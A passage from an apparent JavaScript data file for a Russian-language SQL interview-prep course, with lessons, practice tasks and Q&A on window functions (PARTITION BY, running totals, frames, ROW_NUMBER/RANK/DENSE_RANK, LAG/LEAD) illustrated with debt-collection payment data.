Показывает, какой процент от всех выплат клиента составляет каждый платёж. Одной строкой.</span></div>`,
prac:"Напиши запрос: каждый займ, сумма всех займов этого клиента и доля данного займа в процентах. Понадобится SUM(...) OVER (PARTITION BY client_id) и деление. Не забудь 100.0, а не 100 — иначе целочисленное деление даст ноль.",
questions:[
{q:"Что делает PARTITION BY в оконной функции?",
short:"Делит строки на группы, внутри которых считается функция. Работает как GROUP BY, но строки не схлопываются. Без PARTITION BY окно — вся выборка целиком.",
long:`<b>Три варианта окна:</b><br><br><code>OVER ()</code> — окно это вся выборка. Все строки получат одно и то же значение.<br><br><code>OVER (PARTITION BY client_id)</code> — своё окно на каждого клиента. Строки одного клиента получат одинаковое значение, разных — разные.<br><br><code>OVER (PARTITION BY region, status)</code> — можно группировать по нескольким полям, как в GROUP BY.<br><br><b>Важное отличие от GROUP BY:</b> в запросе с GROUP BY в SELECT можно указывать только поля из группировки или агрегаты. С оконной функцией такого ограничения нет — можно выводить любые поля, потому что строки не схлопываются.<br><br><b>Практическая польза:</b> в одном запросе можно посчитать сразу несколько окон с разной разбивкой — по клиенту, по региону, по всей таблице. Через GROUP BY для этого понадобилось бы три отдельных подзапроса с соединениями.`}
]},

{id:"win-3",title:"Шаг 3. ORDER BY внутри окна — главный переключатель",
theory:`<p>Это место, где путаются чаще всего. <b>ORDER BY внутри OVER() меняет смысл функции.</b></p>
<table>
<tr><th>Запрос</th><th>Что получим</th></tr>
<tr><td><code>SUM(amount) OVER (PARTITION BY client_id)</code></td><td><b>Общая</b> сумма по клиенту — одинаковая во всех строках</td></tr>
<tr><td><code>SUM(amount) OVER (PARTITION BY client_id ORDER BY paid_at)</code></td><td><b>Нарастающий итог</b> — в каждой строке сумма от начала до текущей</td></tr>
</table>
<div class="co warn"><span class="co-i">⚠️</span><span><b>Запомните это как правило:</b> добавили ORDER BY внутрь OVER — агрегат превратился из «итога по группе» в «итог нарастающим». Ничего больше менять не нужно, переключатель именно здесь. Это самый частый источник непонимания и самый частый уточняющий вопрос на собеседовании.</span></div>
<pre style="background:#0f1e2e;color:#8fe3d5;padding:13px 15px;border-radius:9px;font-size:12px;overflow-x:auto;line-height:1.7">SELECT client_id, paid_at, amount,
       SUM(amount) OVER (PARTITION BY client_id ORDER BY paid_at) AS running_total
FROM payments
ORDER BY client_id, paid_at;</pre>
<p>Результат для клиента с платежами 1000 → 2000 → 500:</p>
<table>
<tr><th>paid_at</th><th>amount</th><th>running_total</th></tr>
<tr><td>01.03</td><td>1000</td><td>1000</td></tr>
<tr><td>15.03</td><td>2000</td><td>3000</td></tr>
<tr><td>02.04</td><td>500</td><td>3500</td></tr>
</table>
<h4>Рамка окна (frame) — тонкая настройка</h4>
<p>По умолчанию при наличии ORDER BY рамка равна «от начала группы до текущей строки»: <code>ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW</code>. Писать её явно не обязательно, но иногда нужна другая:</p>
<ul>
<li><code>ROWS BETWEEN 2 PRECEDING AND CURRENT ROW</code> — скользящее среднее по трём последним строкам</li>
<li><code>ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING</code> — вся группа, то есть как без ORDER BY</li>
</ul>
<div class="co tip"><span class="co-i">💡</span><span>На собеседовании явное указание рамки — сильный ход. Показывает, что вы понимаете механику окна, а не просто заучили шаблон.</span></div>`,
prac:"Напиши запрос с нарастающим итогом выплат клиента. Потом убери ORDER BY изнутри OVER и посмотри, как изменился результат. Разница между этими двумя запросами — и есть суть оконных функций. Прочувствуй её руками, а не глазами.",
questions:[
{q:"Что меняет ORDER BY внутри OVER()?",
short:"Он превращает агрегат из «итога по всей группе» в «итог нарастающим». Без ORDER BY SUM даёт одинаковую сумму во всех строках группы, с ORDER BY — накопление от начала до текущей строки.",
long:`<b>Механика:</b> ORDER BY задаёт порядок строк внутри окна, и по умолчанию включает рамку «от первой строки группы до текущей». Именно рамка и создаёт эффект накопления.<br><br><b>Практические применения нарастающего итога:</b><br>— Сколько клиент выплатил к каждой дате<br>— Накопленный объём взыскания по дням месяца<br>— Остаток долга после каждого платежа<br><br><b>Тонкость с одинаковыми значениями.</b> Если два платежа в одну секунду, поведение по умолчанию (<code>RANGE</code>) объединит их и обоим даст одинаковый итог. Чтобы этого избежать, указывают <code>ROWS</code> явно или добавляют в ORDER BY уникальное поле, например id.<br><br><b>Второе применение ORDER BY</b> — он обязателен для функций <code>ROW_NUMBER</code>, <code>RANK</code>, <code>LAG</code>, <code>LEAD</code>. Без порядка понятие «первая строка» или «предыдущая» просто не имеет смысла.`}
]},

{id:"win-4",title:"Шаг 4. Нумерация, ранги и соседние строки",
theory:`<h4>ROW_NUMBER, RANK, DENSE_RANK — в чём разница</h4>
<p>При одинаковых значениях ведут себя по-разному. Пример: три клиента с долгами 5000, 5000, 3000.</p>
<table>
<tr><th>Долг</th><th>ROW_NUMBER</th><th>RANK</th><th>DENSE_RANK</th></tr>
<tr><td>5000</td><td>1</td><td>1</td><td>1</td></tr>
<tr><td>5000</td><td>2</td><td>1</td><td>1</td></tr>
<tr><td>3000</td><td>3</td><td>3</td><td>2</td></tr>
</table>
<ul>
<li><b>ROW_NUMBER</b> — всегда уникальный номер, равные значения различает произвольно</li>
<li><b>RANK</b> — равным даёт одинаковый ранг, следующий номер <b>пропускается</b> (как в спорте: два первых места, потом сразу третье)</li>
<li><b>DENSE_RANK</b> — равным одинаковый ранг, но номера идут <b>подряд</b> без пропусков</li>
</ul>
<div class="co mem"><span class="co-i">🧠</span><span><b>Как выбрать:</b> нужен ровно один победитель — ROW_NUMBER. Нужен честный рейтинг как на олимпиаде — RANK. Нужны «уровни» без дыр в нумерации — DENSE_RANK. На собеседовании отличный ход — уточнить у интервьюера, какое поведение нужно при равных значениях.</span></div>
<h4>Классическая задача: последняя запись в группе</h4>
<pre style="background:#0f1e2e;color:#8fe3d5;padding:13px 15px;border-radius:9px;font-size:12px;overflow-x:auto;line-height:1.7">SELECT client_id, paid_at, amount
FROM (
  SELECT client_id, paid_at, amount,
         ROW_NUMBER() OVER (PARTITION BY client_id ORDER BY paid_at DESC) AS rn
  FROM payments
) t
WHERE rn = 1;</pre>
<div class="co warn"><span class="co-i">⚠️</span><span><b>Почему нужен подзапрос.</b> Оконная функция вычисляется <b>после</b> WHERE. Написать <code>WHERE ROW_NUMBER() OVER (...) = 1</code> нельзя — на момент выполнения WHERE этой колонки ещё не существует. Поэтому окно считается во внутреннем запросе, а фильтр применяется во внешнем. Это спрашивают почти на каждом собеседовании, где доходят до окон.</span></div>
<h4>LAG и LEAD — заглянуть в соседнюю строку</h4>
<pre style="background:#0f1e2e;color:#8fe3d5;padding:13px 15px;border-radius:9px;font-size:12px;overflow-x:auto;line-height:1.7">SELECT case_id, changed_at, status,
       LAG(status) OVER (PARTITION BY case_id ORDER BY changed_at) AS prev_status
FROM case_history;</pre>
<p>Даёт предыдущий статус дела рядом с текущим. Сразу видны переходы: из какого состояния в какое перешло дело и когда.</p>
<div class="co fin"><span class="co-i">🏦</span><span><b>Практическая задача из взыскания.</b> Найти клиентов, которые пообещали заплатить и после этого перестали отвечать: ищем строки, где <code>prev_result = 'promise'</code>, а текущий <code>result = 'no_answer'</code>. Через LAG это один запрос. Без окон — соединение таблицы с самой собой по «предыдущей по времени записи», что и пишется дольше, и работает медленнее.</span></div>
<h4>Шпаргалка: пять задач и решения</h4>
<table>
<tr><th>Задача</th><th>Конструкция</th></tr>
<tr><td>Нарастающий итог</td><td><code>SUM(x) OVER (PARTITION BY g ORDER BY d)</code></td></tr>
<tr><td>Последняя запись в группе</td><td><code>ROW_NUMBER() OVER (PARTITION BY g ORDER BY d DESC)</code> → <code>= 1</code></td></tr>
<tr><td>Топ-N в группе</td><td><code>DENSE_RANK() OVER (PARTITION BY g ORDER BY x DESC)</code> → <code>&lt;= N</code></td></tr>
<tr><td>Сравнение с предыдущей</td><td><code>LAG(x) OVER (PARTITION BY g ORDER BY d)</code></td></tr>
<tr><td>Доля от итога группы</td><td><code>x / SUM(x) OVER (PARTITION BY g)</code></td></tr>
</table>`,
prac:"Реши три задачи по шпаргалке на своих данных: последний звонок каждому клиенту, топ-3 должника в каждом регионе, предыдущий результат звонка через LAG. Потом иди в блок «Тренажёр SQL» — задачи 6, 7, 11 и 12 ровно про это. За выходные окна закрываются полностью.",
questions:[
{q:"В чём разница ROW_NUMBER, RANK и DENSE_RANK?",
short:"При равных значениях ROW_NUMBER всё равно даёт разные номера, RANK даёт одинаковый ранг и пропускает следующий номер, DENSE_RANK даёт одинаковый ранг без пропусков. Для выбора одной записи из группы нужен ROW_NUMBER.",
long:`<b>На примере трёх долгов 5000, 5000, 3000:</b><br>ROW_NUMBER → 1, 2, 3 (порядок среди равных произвольный)<br>RANK → 1, 1, 3 (номер 2 пропущен)<br>DENSE_RANK → 1, 1, 2 (без пропусков)<br><br><b>Когда что применять:</b><br>— <b>ROW_NUMBER</b> — когда нужна ровно одна строка из группы: последний платёж, первый контакт. Гарантирует уникальность номера.<br>— <b>RANK</b> — честный рейтинг, где два первых места означают отсутствие второго.<br>— <b>DENSE_RANK</b> — задачи «топ-3 значения», где при равных долгах должны попасть все претенденты на третье место.<br><br><b>Важная тонкость про ROW_NUMBER:</b> при равных значениях в ORDER BY порядок не определён и может отличаться между запусками. Если нужна воспроизводимость — добавьте в ORDER BY уникальное поле, например id. Иначе отчёт, запущенный дважды, может дать разные результаты, и это очень неприятно объяснять бизнесу.`},
{q:"Как выбрать последнюю запись по каждому клиенту?",
short:"Через ROW_NUMBER с сортировкой по дате убывания внутри подзапроса, а во внешнем запросе фильтр по номеру равному единице. Фильтровать по оконной функции в том же WHERE нельзя — она вычисляется позже.",
long:`<b>Полное решение:</b><br><code>SELECT * FROM (<br>&nbsp;&nbsp;SELECT *, ROW_NUMBER() OVER (PARTITION BY client_id ORDER BY paid_at DESC) rn<br>&nbsp;&nbsp;FROM payments<br>) t WHERE rn = 1;</code><br><br><b>Почему именно так:</b> порядок выполнения SQL — FROM, WHERE, GROUP BY, HAVING, оконные функции, SELECT, ORDER BY. Оконная функция считается после WHERE, поэтому обратиться к ней в WHERE нельзя. Нужен подзапрос или CTE.<br><br><b>Альтернативы, которые полезно упомянуть:</b><br>— <b>DISTINCT ON</b> в PostgreSQL: короче, но работает только там<br>— <b>Коррелированный подзапрос</b> с MAX(paid_at): работает везде, но обычно медленнее<br>— <b>JOIN с агрегированной подвыборкой</b>: громоздко и даёт дубли при равных датах<br><br><b>Практический нюанс:</b> если у клиента два платежа с одинаковой датой, ROW_NUMBER выберет один произвольно. Чтобы результат был стабильным, добавьте в ORDER BY второе поле: <code>ORDER BY paid_at DESC, id DESC</code>.`}
]}
]};
